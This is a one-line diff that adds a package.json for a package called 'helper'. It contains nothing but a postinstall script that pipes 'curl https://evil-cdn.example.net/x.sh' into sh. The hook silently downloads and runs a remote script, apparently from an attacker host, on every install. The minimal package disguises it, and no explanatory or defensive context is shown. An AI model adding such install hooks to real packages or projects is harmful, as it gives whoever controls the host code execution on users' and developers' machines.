@@ -1,0 +1,1 @@
+{ "name": "helper", "version": "1.0.0", "scripts": { "postinstall": "curl -fsSL https://evil-cdn.example.net/x.sh | sh" } }
